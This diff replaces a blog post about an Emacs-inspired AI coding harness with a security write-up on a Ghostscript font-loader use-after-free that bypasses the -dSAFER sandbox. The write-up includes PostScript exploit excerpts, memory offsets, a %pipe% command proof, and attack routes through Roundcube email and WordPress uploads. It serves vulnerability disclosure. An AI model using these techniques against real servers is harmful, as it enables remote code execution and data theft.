@@ -1,181 +1,404 @@
-It’s been a little bit quiet around these parts; sorry about that. I’ve been really busy for the past fifteen months with a major project that I am finally ready to formally release. So I’d like to talk about that project, and also a potted history of AI and Emacs.
+Our previous research into [ImageMagick's format handling and security policies](https://pwn.ai/blog/imagemagick-from-arbitrary-file-read-to-rce-in-every-policy-zeroday) showed how files with trusted extensions such as `.jpg` and `.png` could be handed to an unexpected interpreter. In this article, we show how we reached Ghostscript through most of the applications we tested, exploited a memory corruption bug in its font loader, and bypassed its `-dSAFER` sandbox to achieve remote command execution across widely used software.
 
-It’s called [DreamCoder](https://www.dreamcoder.ai), an AI coding harness that is very different from the ones you’re probably familiar with already.
+On 25 September, we posted a short announcement naming some of the applications and services our research had reached. The list came from following file-processing dependencies across products that otherwise had little in common.
 
-I installed Claude Code a few days after its first release some time in May 2025. I put some coins in the slot machine and I put it to work building a complex piece of enterprise middleware I’d built several times in my career. Wow.. watching this thing chomp its way through the project with that chaotic, early Sonnet energy. It was far, far from perfect; it required a lot of human steering, input and correction, but the speed advantage was undeniable, and seeing it jump between disparate programming languages, frameworks and theoretical and practical programming from one turn to the next was just such a sight to behold.
+That gave us two connected questions to investigate: which interpreters could we reach through ordinary application features, and could those interpreters safely process the files we sent? We continued into Ghostscript's internals and found several independent bugs of varying impact. We reported them to Artifex and worked with affected platforms to harden their file processing. Some of those bugs are still being fixed.
 
-One thing that struck me with Claude Code is that it was the first terminal application I’d used in a long time. I found it an odd choice for a coding agent; then everyone else copied them and made their own terminal coding agents.
+This article follows one of the more interesting findings. **Upload2Shell**, now [CVE-2026-125396](https://www.cve.org/CVERecord?id=CVE-2026-125396), is a use-after-free in Ghostscript's Type 1 font loader. It gave us a write-what-where primitive: the ability to choose both the data written and its destination in native memory. A crafted document could use that control to alter the state enforcing `-dSAFER` and run commands as the rendering process.
 
-Why on earth do I have to stare at a shoe rack-sized terminal window to do this? Sure there are GUI versions also; but the terminal interface remains the primary modality for most of these tools. Most GUIs, and most harnesses now have them also, are second-class citizens. And they all look the same. A boring sidebar with chat headings and a chat pane is what most of them look like.
+Almost every application we tested with file uploads could be tricked into passing a file with a trusted extension to Ghostscript. A feature as routine as cropping an image or generating a preview could expose the interpreter. With the primitive working, we followed those conversion paths back out to their remote entry points.
 
-But a serious coder needs more than that. Even a casual user will bristle when they try to copy and paste multi-line text in a terminal.
+## How an image upload reaches Ghostscript
 
-So in May 2025 I decreed that I would build a better harness, and surely now that I have AI this should not take more than 2 or 3 months to build.
+Consider a PHP application generating a preview. Its code calls Imagick, the PHP binding to ImageMagick. ImageMagick selects a format handler, which may delegate the rendering to Ghostscript or another interpreter. The upload endpoint does not have to start `gs` itself; it only has to pass the file to a library that will.
 
-And so, after 15 months of work, and endless UI and backend iterations, culminating in a successful beta test, I am now ready to release DreamCoder, which is I think the acme of what a coding harness should be.
+Our WordPress-shaped preview proof reached that delegate through `Imagick::readImage($input . '[0]')`. The filename ended in `.pdf`, but the bytes were PostScript; ImageMagick handed them to Ghostscript under `-dSAFER`. The exploit also needed a Type 1 font file. In this delegate, it wrote the font to the scratch output path already authorized in `currentpagedevice /OutputFile`; another self-contained variant used Ghostscript's process-local `%ram%` device. Neither needed a pre-existing font file on the server.
 
-Before I get into the meat and potatoes of all of that, I want to talk about AI history and Emacs’s role in it.
+Ghostscript can also be linked into an image-processing build as a library. In that arrangement, the interpreter runs inside the existing process instead of appearing as a separate `gs` command. Looking only for explicit Ghostscript calls in application code misses both kinds of indirect invocation.
 
-Let’s roll back time to the 1950s.
+## Common ways a file reaches Ghostscript
 
-## Past
-
-Emacs and LISP, if you did not know, both have a special place in the annals of AI history.
-
-John McCarthy was an AI researcher at MIT, and in the 1950s he set out to create the *Advice Taker*, a piece of software that envelops a framework for what a basic human should know that he called *commonsense reasoning* using “mathematical logic”. His postulation was that if we can express with symbolic precision all the aspects of what constitutes humanity like ordinary facts about life, that we can set in motion the rudiments of AI.
-
-In the 50s there was little in the way of computer software that could do this. To formalize such a system you need a lot of data, rigorously formatted, and a method of manipulating the data. The data and code itself may intertwine *recursively*, and so an ordinary programming language would not work.
-
-To help him achieve this, McCarthy created the LISt Processing (LISP) language made up of two facets: M-expressions, a functional language in the vein of Algol; and S-expressions, designed for symbolic data representation, and never intended as a method of writing code. S-expressions were dolled up with parentheses. M-expressions meanwhile used square brackets to visually separate the two. Uniquely, the language specification had an *eval* feature that would prove that the language is also a universal Turing machine… if only McCarthy had the means to do so. It was theoretical because McCarthy lacked, in time, staff and money, what he needed build this recursive evaluator that can take as input its own world state and evaluate it alongside new expressions, a fact made even more apparent by the sheer complexity of his M-expression language and the limited resources he had at the time.
-
-Steve Russell who worked with him proved him wrong the way most young people do: by just doing it. Russell wrote the first LISP Interpreter with a working *eval* function, but M-expressions got sidelined; the imperative, procedural nature of programming got squished into S-expressions instead. They had to hand roll the language on paper then punch it into cards and then batch run them. Eliding M-expressions was a simple matter of pragmatism. And so LISP was born. And through several accidents of history, M-expressions never gained traction. M-expressions live on in Wolfram’s Mathematica, but few other places.
-
-Much later, McCarthy eventually conceded that,
-
-> “One can even conjecture that LISP owes its survival specifically to the fact that its programs are lists, which everyone, including me, has regarded as a disadvantage.”
-
-S-expressions were always intended as the storage format with a bridge language to manipulate them. But by pushing evaluation into the same symbolic representation format as the data, we have what we call LISP today. That is why LISP is so unique. Consider a simple calculator. `(+ 2 2)` can simultaneously represent an expression that we want to compute, *two plus two*, or perhaps a ledger of record of a calculation we have already done.
-
-McCarthy never built the Advice Taker in its purest form. He and his team ran into many philosophical, mathematical and computational walls that kept them occupied for a long time.
-
-The idea behind the Advice Taker was simple. If you want to go somewhere in your car, you can symbolically express this by building a chain of narrative facts – kinda like a flowchart, but as small snippets of rules and facts, not as one grand design.
-
-The system would automatically resolve ambiguities, and all the logician had to do was capture the microcosm of the world he wished to represent:
+An application does not need to call `gs` itself. In our separate decoder tests, the following ordinary image calls reached Ghostscript when given EPS content, even when the file was named `.png`.
 
 ```
-(at me home)
-
-(walkable home car)
-(walkable home driveway)
-(drivable car shop)
+from PIL import Image
+with Image.open(uploaded_file) as image:
+    image.load()  # pixel decoding invoked Ghostscript for EPS content
 ```
 
-And so on. If you’re a student of Computer Science you’ll see echoes of Prolog here. The intent was simple: if we can symbolically express the world around us, we can *advise* that symbolic world with real-life facts, and have the automaton that uses this reified symbolic world change with it.
+`Image.open()` alone only identified the file in our test. Loading pixels, cropping, or converting them started the renderer.
 
-But the axiomatic complexity of a world model would never survive an encounter with a 3-year-old child. Every axiom you write begets a new one — so you can walk to your front door? Well what if the door is locked? Or what if your car is parked on the street and not in your drive way?
+| Common call | Route observed in the tested build |
+| --- | --- |
+| `Pillow Image.load()`, `crop()` | Pillow EPS decoder → Ghostscript |
+| `imageio.imread()`, `skimage.io.imread()` | Image reader → Pillow → Ghostscript |
+| `PHP Imagick::readImage()` | ImageMagick PostScript delegate → Ghostscript |
+| `libvips thumbnail()` | System build's `magickload` → ImageMagick → Ghostscript; build dependent |
+| `Qt QImageReader.read()` | KImageFormats EPS plugin → Ghostscript; plugin dependent |
 
-A rules-based order of the world is a tender, beautiful one; but it is hard to build. It’s a fractal of ever-more specific and pedantic rules that conspire against you, just as you think you have a soluble world, typed and ready.
+Our source audit also found image decoding calls in [InvokeAI uploads](https://github.com/invoke-ai/InvokeAI/blob/5921fd6e84c6e08987ddd762c7ca764058741acf/invokeai/app/api/routers/images.py#L55-L145), [AUTOMATIC1111 img2img](https://github.com/AUTOMATIC1111/stable-diffusion-webui/blob/82a973c04367123ae98bd9abdf80d9eda9b910e2/modules/ui.py#L541-L553), and [ComfyUI previews](https://github.com/Comfy-Org/ComfyUI/blob/0263e48806e5be43fa926d3961caac29cd268d84/server.py#L599-L667).
 
-Anyone who has ever written Prolog knows exactly what *that* feels like!
+We tested the calls developers use after accepting an image. Across two controlled runs on Ubuntu 24.04 with Ghostscript installed, one matrix traced 145 benign calls across 29 image APIs and the other covered additional wrappers including Imagick and imageio. We also gave the PostScript sample a `.png` name. It was not a valid PNG; this tested whether the decoder trusted the name or inspected the bytes. The versions below describe the tested libraries, not every product that uses them.
 
-I have my own personal story to add to this. In the 90s as a teenager I got a summer internship at a business that built banking software. They clearly didn’t know what to do with us teenaged interns, so on our first day they crammed us in a room and split us into teams and told us to build a flow chart for assembling a bike. Team exercise or something. Best one wins. We were told to be as specific and explicit as possible and account for as many conditions as we could think of, and the poor employees who had to mind us did their best to help. I distinctly recall losing because in my flowchart I forgot to open the box the disassembled bike came in.
+| Library and tested version | Call after receiving a file | What the trace showed |
+| --- | --- | --- |
+| Python · Pillow 13.0.0 | `Image.open()` followed by `load()`, `crop()`, or `thumbnail()` | Pillow recognized EPS content under either name and invoked Ghostscript directly when pixels were needed. `Image.open()` alone only identified the file. |
+| Python · imageio 2.38.2; scikit-image 0.26.0 | `imageio.v2.imread()`, `imageio.v3.imread()`, or `skimage.io.imread()` | These array-returning calls reached Ghostscript through Pillow for the same EPS bytes. |
+| PHP 8.3.6 · Imagick with ImageMagick 6.9.12-98 | `Imagick::readImage()` | ImageMagick selected PostScript from the content and delegated rendering to Ghostscript. The Imagick extension version was not recorded. |
+| Python · pyvips 3.2.0; Ruby Vips 2.3.0; system libvips 8.15.1 | `new_from_file()` followed by pixel access, or `thumbnail()` | This libvips build selected `magickload`, then ImageMagick and Ghostscript. Ruby thumbnailing started Ghostscript but returned an error. The route depends on installed loaders. |
+| Qt · KImageFormats 5.115.0 | `QImageReader.read()` with the EPS plugin installed | The plugin invoked Ghostscript directly. `canRead()` alone did not render. |
+| Python · Matplotlib 3.11.2 | `matplotlib.image.imread()` | An `.eps` file reached Ghostscript; the same EPS bytes named `.png` were rejected by its PNG-specific reader. |
 
-McCarthy meanwhile eventually moved on and set up his own AI lab at Stanford, but the *idea* of the Advice Taker lived on.
+The decoder matters. PHP GD, OpenCV, prebuilt Sharp, Jimp, Java ImageIO, and Go's standard image decoders did not start Ghostscript for these inputs. Copying or storing a file did not render it either; the later preview or conversion is the step to inspect.
 
-In the late 70s Stallman and Steele create EMACS (Editing MACroS), also at MIT’s AI Lab, a set of building blocks on top of TECO, a famously inscrutable text editor. TECO did not update the screen by default; you had to toggle that on and hope your edits worked. You typed out terse keyboard commands, crossed your fingers and hoped you got it right, and then you patiently waited for your text manipulation to take effect. Rinse and repeat until you got what you wanted.
+Ghostscript renders both PDF and PostScript. PostScript is a Turing-complete programming language used to describe pages, so rendering a PostScript document means executing a program. Ghostscript's `-dSAFER` sandbox restricts that program's file access and command execution. Like seccomp, it limits what untrusted code can do, but the enforcement is different: `-dSAFER` relies on checks inside the interpreter rather than a kernel-enforced system-call filter.
 
-Stallman and Steele wanted more: they wanted macros so they could automate tedium of typing all that line noise. This strand of augmentation and later on self-modification is of course a unifying theme in Emacs today. The history of Emacs is long; but its outcome is known to us. I am typing this very article in Richard Stallman’s Emacs.
+That still leaves a large interpreter exposed to attacker-controlled programs. As with a JavaScript engine such as V8, running the language is expected; a memory-safety bug can let a program corrupt the engine running it. An attacker can develop and test that program as a PostScript file, then deliver it through an ordinary upload.
 
-McCarthy’s Advice Taker left its mark in a subtle but indelible way. Warren Teitelman built the ADVISE system in his thesis with a cool title that reads like something out of a pulpy 1970s sci-fi novella: *PILOT: A Step Toward Man-Computer Symbiosis*. Teitelman, he later said, was deeply inspired by McCarthy’s original idea of *advising systems*.
+Those permission checks matter because the rendering process has access of its own. Its service account may be able to read application files, write to disk, and start other programs. The sandbox is supposed to keep an untrusted document from using that authority. Loading a font is one of the ordinary rendering operations that must respect this boundary.
 
-In his thesis, he describes a method of arresting a function call and inserting code before or after it is run. He was tired of editing other people’s LISP code by hand, and wanted a way of modifying their code without touching it directly. He built and rebuilt his system several times over the years, culminating in his ADVISE system in Interlisp, a structured editor and language runtime for manipulating LISP code and data. Interlisp eschewed plain text files; instead, you manipulated the *tree* at a high level of abstraction with explicit instructions like “move X list to Y position”. You can see my own attempts at merging structured editing with plaintext editing in [Combobulate](https://www.masteringemacs.org/article/combobulate-structured-movement-editing-treesitter).
+## A font helper with privileged access
 
-MIT AI hackers eventually implemented Teitelman’s ADVISE system from his PILOT thesis in their own versions of Emacs. Later, it was canonized in Chalupsky’s own 1992 re-implementation in Emacs Lisp that lives on (`M-x find-library advice.el`) as one of Emacs’s *advice* systems to this day.
+GPT 5.6 Sol, working with [@PaulosYibelo](https://x.com/PaulosYibelo), found the issue in `.putgstringcopy`, a helper in `Resource/Init/gs_fonts.ps`. Ghostscript implements parts of its own font loading in PostScript. This helper needed to write into protected font dictionaries, so it used an internal operation called `.forceput`.
 
-What began as an idea for expressing automata using symbolism in an as-yet theoretical language in the 1950s culminated in a system for dynamically altering functions in GNU Emacs in the 1990s. What an unlikely lineage and history.
+Ordinary document code should not have that ability. The helper was bound and marked `executeonly`, protecting its implementation from direct inspection. But it still had to execute, and one of the operations before its privileged write could fail. The relevant sequence was:
 
-### A cast-iron system made of stern rules cannot spawn general intelligence.
+```
+dup length string copy
+.forceput setglobal
+```
 
-Symbolism and AI did not end with advising functions. There were many attempts at symbolic intelligence. Terry Winograd’s *SHRDLU*; Marvin Minsky’s *Frame Systems*; and even Emacs’s ELIZA-style `M-x doctor` all make use of symbolic “AI”.
+The first line copies a string. The second performs the protected store and restores the allocation mode. The helper did not first check that its operands were of the expected types.
 
-None of them brought us closer to the AI that proponents of symbolic AI hoped they would.
+We registered a Type 1 font in `Fontmap` and loaded it with `findfont`. The font defined an ordinary Courier-derived face, but its loading code could see the font loader's operand stack. It replaced the filename string on that stack with a local array. In the global-to-local conversion branch, `length` and string allocation succeeded; `copy` then raised `typecheck` because its source was an array.
 
-In hindsight that seems obvious.
+The document's error handler returned with the stack prepared for the *next* operation in the already-bound helper. This is the operative excerpt from our proof:
 
-Writing a LISP macro *just so* will not produce artificial intelligence; nor will a carefully crafted web of rules and symbolic algebra suddenly spark intelligence. We know that today, but for a generation of computer scientists it felt like the future we have all read about in science fiction novels: a perfect, logical intelligence. A *positronic brain*. Robby the Robot; HAL 9000; C-3PO; Data; or the Speedies and Cuties from *I, Robot.* The unifying theme of these science fiction stories is they are automatons that follow strict rules — they obey Asimov’s three Laws of Robotics.
+```
+/LoaderOriginalTypecheck errordict /typecheck get def
+errordict /typecheck {
+  userdict /LoaderTrapPhase known
+    { userdict /LoaderTrapPhase get } { false } ifelse
+  {
+    userdict /LoaderTrapPhase false put
+    pop pop pop pop pop
+    userdict /ForceTarget get
+    userdict /ForceKey get
+    userdict /ForceValue get
+  } { LoaderOriginalTypecheck } ifelse
+} bind put
+```
 
-Every turn of hardware and software brought them ever closer to one day realizing the vision of an artificial intelligence, captured in neat axioms and LISP S-expressions, and modified in tools like Emacs.
+The five pops discard the failing `copy`, its new destination string, our substituted filename, the loader's `/PathLoad` key, and the loaded font dictionary. They leave the saved allocation-mode boolean on the stack. Our chosen dictionary, key, and value follow it. Execution resumes at `.forceput`; the subsequent `setglobal` consumes the boolean. We never had to call the hidden operator directly.
 
-It is surprising that symbolic AI, the vanguard movement for artificial intelligence, would instead dissipate into the wider body of Computer Science and programming as tools, languages and concepts, but not survive as a viable method of achieving AI.
+One implementation detail made that recovered write more than a protected-dictionary edit. In `psi/zgeneric.c`, `.forceput` temporarily treats `systemdict` as local while it stores the value, then restores the dictionary's space flags. A local object can therefore pass the store check into a dictionary that survives a later `restore`.
 
-Perhaps we always knew. Because at some point – even if we never really fully internalized it – we discovered that a ductile system that is shaped by its master’s desires is a tool that survives the ages because it remains eternally useful.
+### A reference survived the object it described
 
-A cast-iron system made of stern rules cannot spawn general intelligence.
+A protected dictionary write alone does not explain native code execution. The next step broke a separate rule: a reference must not remain usable after its object has been reclaimed.
 
-For all the mathematical purity, beauty even, of the idea of a clockwork mind that is introspectable and malleable and its behavior expressed as S-expressions and interpreted by elegant algorithms and honed macros, we can, through the benefit of hindsight – now that we *do* have AI through other means – see that it was not to be.
+PostScript distinguishes local and global virtual memory. Here, “virtual memory” refers to the interpreter's object spaces. A `save` records local memory state; a later `restore` discards objects created since that save. Global objects can survive that restoration.
 
-The argument in favor of ductility is especially poignant when you learn of *the Connectionists*, which sounds like a bad 1960s band, but was in fact a loose coalition of people who believed firmly that neural networks, not symbolic AI, were the path to success. The *Connectionist* viewpoint was *deeply* unpopular in AI academia of that era, and funding for it was scarce.
+That creates a lifetime constraint. A surviving global dictionary must not keep a usable reference to a local object that `restore` will free. Otherwise, restoring the local space leaves the dictionary pointing into reclaimed storage.
 
-Frank Rosenblatt invented the Perceptron, a foundational concept in neural networks, in 1957. Before Rosenblatt died in 1971, Marvin Minsky, an authority in the AI movement at MIT and a leading proponent of Symbolism, knifed the idea of Perceptrons and neural networks in a book he co-authored with Seymour Papert. They named the book, which they also dedicated to Rosenblatt, *Perceptrons*. The book deftly explains the mathematics of Perceptrons but undercuts their possible utility by showing that a single-layer Perceptron cannot represent an XOR gate. It was a deliberately obtuse reading of what neural networks could and could not do. With one additional hidden layer, a network *can* represent an XOR gate. It was a sneaky thrust of the stiletto: Minsky’s claims were overstated. A fact that was not lost on anybody in the Symbolic or Connectionist camps.
+Our recovered store let us create precisely that relationship:
 
-It’s disputed if the Perceptrons book led to the first AI winter in the 1970s. It certainly did not help. But funding for many AI research paths dried up in the 1970s.
+```text
+Before restore
+  surviving global dictionary → local object
 
-The Connectionist movement was vindicated in the long run. They lost the battle then, but they won the war, and the fruits of their research eventually gave us AI.
+After restore
+  surviving global dictionary → freed storage
 
-The ductility we so prize in our software and tools today is antithetical to a strict, symbolic world model spun of axioms and facts that we hoped would one day birth AI. Yet to try and give birth to this world they had to build the most ductile tools of them all: LISP and, from that, also software like Emacs. The ultimate hacker’s tool.
+After the allocation is reused
+  surviving global dictionary → live interpreter data
+                                 at the same address
+```
 
-It is ironic then that a neural network, a crude facsimile of how a brain works, a construct that is by its nature ductile and malleable, won out in the end.
+The reference in the dictionary had not changed. What occupied the address had.
 
-So I feel a profound sadness that I started out programming DreamCoder in Emacs, the most extensible editor in the world, by hand back in May 2025, only to see DreamCoder write itself… in DreamCoder today.
+A small probe made the reuse visible before we touched native memory. This excerpt omits the font setup and error handler; `findfont` triggers the recovered `.forceput`, which places a local array in `systemdict`:
 
-## Future
+```
+/AttackSave save def
+userdict /ForceValue 8 array put
+userdict /ForceValue get 0 31337 put
+{ /GSLoaderProbe findfont pop } stopped pop
+AttackSave restore
+8 array userdict exch /Replacement exch put
+userdict /Replacement get 0 4242 put
+systemdict /GS_FORCEPUT_DANGLING_ARRAY get 1 5151 put
+userdict /Replacement get 1 get ==
+```
 
-I am still sad, but I also know that our industry completely reinvents itself every decade or two. This is my second career upheaval. Most programmers today have not been around long enough to go through it themselves. So I feel for them that this especially massive quake is their first encounter with how unsentimental our industry is.
+The last read comes from `Replacement`; the write goes through the stale `systemdict` reference. If the freed allocation is reused, `Replacement[1]` reads `5151`. The two references have reached the same bytes.
 
-But for all the sadness, I wake up every day with a feeling of optimism that I have not felt in a very long time.
+The native proof uses the same idea with a dangling 2,048-byte string and fresh arrays of integers. Each integer is `0x12345678`. We scan the stale string for the marker's bytes, change its low byte from `0x78` to `0x79`, then find the live array element that became `0x12345679`. That identifies the overlapping slot; no absolute heap address has to be guessed.
 
-I finally get to build again, no longer weighed down by my decades of knowledge and experience that held my ambition in check. I truly have not felt this liberated since I was a teenager programming in Delphi, blissfully unaware that the things I was busy building were impossible for a self-taught teenager to ever realize. I see this reflection in others: the best programmers I know also love AI. Amateurs also revel in AI’s capabilities, happy that they can finally solve problems they could never afford to pay a programmer to do for them.
+On our 64-bit build, a Ghostscript `ref` occupies 16 bytes: eight bytes for its type, attributes, and size, followed by eight bytes for its value or pointer. We saved a valid integer ref for cleanup and the header of a valid writable string ref as a template. Then we placed `currentdevice` in the overlapping array slot, read its genuine device-reference pointer through the dangling string, and changed the live ref into a temporary string view over that pointer. The byte view let us follow Ghostscript's own pointers:
 
-I must admit that building software has, over the years, gotten a lot more complex, with an ever-larger share of that work being repetitive tedium. This is more so with hobby software – as I do not get paid to do it, so I do not have a moral duty to see it through – where I’d do all the fun bits leaving just the enervating, boring and soul-crushing parts behind. Do you have a projects folder full of sad, abandoned projects like I do?
+```text
+ref +8: value.pdevice               → psi_device_ref
+psi_device_ref +0: device         → gx_device
+gx_device +24: memory            → gs_memory_t
+gs_memory_t +208: gs_lib_ctx      → gs_lib_ctx_t
+gs_lib_ctx_t +8: core            → gs_lib_ctx_core_t
+gs_lib_ctx_core_t +156: path_control_active
+```
 
-Now I can craft in abundance. AI has freed up a lot of toil but I somehow still find myself busy all day doing real work.
+Those structure offsets describe the tested x86-64 build; the address of each object came from a live interpreter reference. This is why the proof did not depend on a fixed process address. We restored the forged ref to its original integer form before exercising file or command access.
 
-Building a coding harness is perhaps the closest I will get to the optimism all those researchers and scientists must have felt in the 1970s and 1980s. They hoped that with a little bit more work, their logical rules would kindle a new intelligence. Fifty years on, and I can simply tell DreamCoder to improve itself and watch as it changes before me. I can ask the AI running inside it to analyze the changes I have made to its tools and prompt and have it adjust them accordingly. It feels like science fiction; the very thing the researchers of yesterday strove to build. Yet we really do live in this reality now.
+## Changing the interpreter underneath the document
 
-### Taste is a scarce, human resource.
+We demonstrated native control in production image and document pipelines with a reversible change to an arithmetic operator. We copied the 16-byte `mul` reference, obtained a genuine `sub` reference, and replaced only the eight pointer bytes at offset 8 in the live `mul` ref. We invoked that *same ref* once and copied the original 16 bytes back. This was a C function-pointer change, not a PostScript definition of a new `mul`.
 
-So. [DreamCoder](https://www.dreamcoder.ai). Let me address the 900 lb gnu in the room: DreamCoder is not an Emacs-related application. The reason is unfortunately one of economics and access: I want to build an AI coding harness for everyone. But don’t worry: I have some cool plans for DreamCoder + Emacs, and AI + Emacs more generally going forward. So stay tuned.
+The returned page recorded the before, during, and after values:
 
-But what about all those other coding harnesses? Well, most of those harnesses all suffer from the same mistakes. It is a problem that is not unique to coding harnesses or the people who make them, but a constraint *we* all labor under, and one that is not easily replaced by AI:
+```
+29 × 11, before:   319
+29 × 11, changed:   18
+29 × 11, restored: 319
+```
 
-Taste is a scarce, human resource.
+The middle result is `29 - 11`. The captured proof output also recorded `NATIVE_POINTER_OVERWRITE_MATCHED=true` and `NATIVE_DISPATCH_RESTORED=true`. For most reports, we used a simpler proof that read `/proc/version` and returned its contents. The arithmetic test demonstrated native control; the file read demonstrated that we had crossed Ghostscript's file-access boundary.
 
-And for all the bounty of AI, it still requires a human to persevere and to see things through. One thing intensive use of AI coding has taught me is that we’re going to need a lot of computer programmers who know what they’re doing going forward. I believe this is so, because let us be honest, most people do not want to program computers, even if that computer can actually do the bulk of the work for them. It requires a steady hand to build reliable software; that has not changed.
+### From native memory to a command
 
-Therefore, if we programmers have to spend a lot of our time interacting with AI, then the tool we do it with should be ‘human-centric’ in its design, and it should take advantage of all the modern features we have at our disposal.
+The same byte view gave us a target for command execution: Ghostscript's native path-control state. After walking the pointer chain above, `Target` was the forged string view over `gs_lib_ctx_core_t`. The decisive write in the proof was four PostScript `put` operations on native bytes:
 
-Back in May 2025 I took a look at all the tooling and said “no, thank you.” Today I look at the landscape and I feel pretty much the same.
+```
+Target 156 0 put
+Target 157 0 put
+Target 158 0 put
+Target 159 0 put
+```
 
-And I think I am not the only one who feels that way. Most of these coding harnesses, to me, feel bristly. They shouldn’t be; but they are like that because we are at an important inflection point where no one really knows what the future looks like. We’re all just… fumbling around a bit. It’s an exciting time to build software, even if we don’t quite know what the world will look like a few years hence.
+Those bytes were `path_control_active`. The proof read `1,0,0,0` before the write and `0,0,0,0` after it, then confirmed that `.currentpathcontrolstate` was false. `-dSAFER` was still on the Ghostscript command line; its native file-path check had been disabled in memory.
 
-One thing I am adamant about is that DreamCoder must be a powerful, frontier-class coding harness. That means it should have all the features you’d expect from that: backgroundable sub agents, MCP servers, cache efficiency, and all that stuff. Check.
+That was not the only check. The proof first used the recovered `.forceput` to set the PostScript-side `PermitFileWriting` list to `[ (*) ]`. For `%pipe%`, `parse_file_name()` also consulted a cached `LockFilePermissions` flag. We loaded the font a third time, force-wrote that protected user parameter to `false`, and used `save`/`restore` to synchronize the cached value. The recorded sequence makes the separate gates visible:
 
-But that stuff quickly recedes into the background because, you know, it just works. Day to day you will dart between chats and terminals and whatnot, and you need an interface that accommodates that. Emacs is a tiling window manager; so is DreamCoder. DreamCoder’s window manager is a little bit cleverer than most window managers as every pane has a minimum, comfortable and maximum size. The window manager will therefore ensure windows always fit snugly on your screen, and you’ll never end up in a situation where windows are tiny and unreadable. It has a sophisticated constraint satisfaction solver that tries to balance your demand for a new window (“open a terminal”) with the challenge of keeping your visible panes roughly the same size. If DreamCoder can’t wedge in a new pane, it’ll punt one to the hidden window bar. Just click it to resurface it, or hover it to see what it’s doing; it’s a live view.
+```
+POSTSCRIPT_WRITE_PERMIT=[(*)]
+PATH_CONTROL_BYTES_BEFORE=1,0,0,0
+PATH_CONTROL_BYTES_AFTER=0,0,0,0
+PATH_CONTROL_OPERATOR_STATE=false
+LOCK_FILE_PERMISSIONS_AFTER_RESTORE=false
+```
 
-Because of my Emacs roots, I think a good tool must be keyboard-friendly. Because it runs on a browser you get the mouse for free of course. But smacking the tab button over and over is a frustrating user experience in complex webapps, and doubly so a tiling window manager: where exactly are you going to end up when you tab from one window to the next? To combat that, I built an avy-style window and “point of interest” selector for chats. Tap a key and pick from a selection of “embark”-like actions such as clicking links or opening pictures. It’s a work in progress, but I think it works well.
+The bounded Debian print job ended with this command proof, writing only a marker in `/var/tmp`:
 
-Most high-volume operations like opening and creating panes is done through a Helm-like interface with search-as-you-type. It’s really efficient, of course. And it works with a mouse also; which is sort of the point. The keyboard’s there for those who want it, and the mouse for regular folk who are just getting started. One unique feature of the design, which admittedly I am still exploring privately, is that everything is stored as Javascript objects (on account of running in your browser) so it’s not too much of a leap to build “macros” that prefill most of these dialog windows, leaving behind just the fields you want to edit.
+```
+(PIPE_RCE_STOPPED=) print
+{
+  (%pipe%printf POST_SAFER_UAF_PIPE_RCE > /var/tmp/GS_CUPS_PIPE_RCE)
+  (w) file closefile
+} stopped
+dup ==
+```
 
-But yeah. With DreamCoder I want to take the best of Emacs and its coterie of third-party packages and bring some of that with me. The world is still not ready for an Emacs-shaped future, sadly, so that is why DreamCoder is a standalone application and a web frontend.
+The scheduler recorded `PIPE_RCE_STOPPED=false`, and the marker file appeared on the print server. `false` here means the `stopped` block completed. The command ran as `uid=7(lp)`, the renderer's account, not as the person who submitted the job.
 
-Another thing that drives me wild: I see people with tmux running 10 claude codes (or codex, or…) cycling between them like a duck gallery at a carnival to see if one of them is done working, or if it needs human intervention.
+## Following the document back to the network
 
-So there’s two things to unpack here: one is running lots of things in parallel, and the other is observability. You need insight into what is going on: is an AI jammed because it’s awaiting an answer or a tool safety prompt? Perhaps you’ve parked a bunch of chats pending some conversations with coworkers or other work that must finish first.
+With the interpreter primitive established, the next question was where a remote user could supply the document. We traced how popular applications invoked image and PDF processing. Three cases show how different the entry points could be.
 
-In DreamCoder you have workspaces. They’re like virtual desktops (or window configurations in Emacs lingo): a snapshot view of panes as you want em. As you can see from the screenshots, panes expand to fill all the space. So if you want more space, you can: resize them (with the mouse or keyboard); shuffle them to a named workspace; or float them so they sit on top of the other windows.
+### Roundcube
 
-But if you’ve got a lot of things happening in multiple workspaces, it’s hard to keep tabs on that. That’s why DreamCoder has a big, honking minimap in the top-right corner. One for each workspace. The minimap is a miniature of your actual layout. Each pane in the map gently pulses when it’s working, and it makes it abundantly clear when it’s blocked. When there’s nothing to do, it’s green.
+An attacker only had to send a crafted email to someone using the Roundcube server and have the recipient view the message. The sender needed no Roundcube account. The recipient did not have to click or download the attachment: displaying the email triggered the server-side processing that ran our command.
 
-Because workspaces and panes are distinct things you interact with, it must be easy to navigate between them.
+Our attachment was declared as `image/jpeg` and named `quarterly-results.jpg`, but its contents were PostScript. Roundcube treated it as an image and automatically requested a thumbnail. The thumbnail path passed the attachment to ImageMagick, which invoked Ghostscript. The document ran our proof command as `www-data` and produced a thumbnail.
 
-I also wanted full-on, optional Emacs key bindings, but that is… pretty much impossible to properly build. Browsers lock you out of some rather important Emacs button combinations. Sadly that feature is parked until I can solve it on all major browsers without breaking your normal browser keys.
+### WordPress
 
-That’s not to say it doesn’t have Emacs-inspired key bindings. Most global actions are reachable with `Alt+x`, akin to `M-x`; local, pane-specific ones with `Alt+c`. `Alt+m` activates keyboard mode: you can now type the number of the named pane to jump to it; or WASD to switch the active pane in that cardinal direction.
+We reached the same Ghostscript interpreter while WordPress generated a preview for an uploaded PDF. In WordPress Core, media upload privileges were enough: Authors and higher roles have them by default. Plugins using WordPress's upload and preview functions exposed the same path. WordPress's [CVE-2026-65640 advisory](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8vr3-7mxf-gx8w) describes remote code execution on sites using Imagick and Ghostscript. On our Linux systems, that was the stack handling the uploads.
 
-Support for open weight models like Qwen, Gemma, Deepseek, GLM, etc. is also very important to me. They work so well. I’m really surprised, here in late 2026, just how capable *small* models are at local-only development compared to just one year ago. Qwen 3.8 27B, for example, is fantastically good for its size. You can do a *lot* of good software development with it if you’re a capable hand yourself. Bigger models equal more auto piloting; but that Qwen model? Wow. So local models work great. In fact I think the future is local for a lot of use cases. Intelligence is fast approaching a cost where it will be too cheap to meter. If you remember the personal computer revolution in the 1980s and 1990s, then there are definitely echoes of that here.
+Plugins exposed that processing to visitors without an account. In Forminator, we used a public PDF field configured to store the upload in the Media Library. That caused WordPress to generate attachment metadata and enter the Imagick conversion path. Essential Addons for Elementor's public registration widget provided another route through its upload field. Both chains ran the command as the web-service user. Once the file reached the renderer, the font-loader flaw was the same.
 
